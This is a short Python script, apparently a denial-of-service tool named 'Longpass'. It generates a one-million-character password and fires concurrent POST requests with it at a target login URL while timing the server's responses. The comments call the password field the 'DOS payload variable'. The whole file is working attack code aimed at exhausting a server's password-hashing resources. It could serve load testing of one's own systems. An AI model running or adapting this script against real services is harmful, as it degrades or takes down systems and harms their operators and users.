import sys
import asyncio
import aiohttp
import time

class Longpass:

    url = ""
    delay = 1
    username = ""
    size = 1000000
    repeats = 20
    password = ""

    iterations = 0
    tasks = list()
    payload = dict()

    def run(self):

        password = self.generatePassword(self.size)
        sys.stdout.write("Done!\n")

        # Set the POST payload
        # @todo Add POST variables from the command line argument, ie. --variables username=john,email=user@domain.com
        # @todo Add an ability to set a custom variable name for the "password" DOS payload variable
        self.payload = { 'username': self.username, 'password': password }


        # Add requests to the task list
        for i in range(self.repeats):
            self.tasks.append(self.makeRequest())

        # Event loop that waits for tasks to complete
        loop = asyncio.get_event_loop()

        # Run the loop until every task is complete
        loop.run_until_complete(asyncio.wait(self.tasks))

        # Close the loop
        loop.close()


    def generatePassword(self, size):
        # Generate password
        # @todo Generate the password from random characters
        sys.stdout.write("Generating password...\n")
        return "x" * size

    async def makeRequest(self):
        """
        Make an asynchronous POST request

        @type url: str
        @param url: Url to test
        @type payload: dict
        @param payload: Dictionary of POST variables
        @type delay: float
        @param delay: Delay between each request in seconds
        @rtype: None
        @return:
        """

        # Measure time
        start = time.time()

        # The actual request
        response = await aiohttp.post(self.url, data = self.payload)

        # Add to iteration counter
        Longpass.iterations += 1

        # Request response time
        duration = time.time() - start

        # Display the progress
        sys.stdout.write("\r" + str(round((self.iterations / self.repeats) * 100, 2)) + "% done - server response time " + str(round(duration, 2)) + " seconds.")

        # Close the connection
        response.close()

        # Wait for a given time
        asyncio.sleep(self.delay)
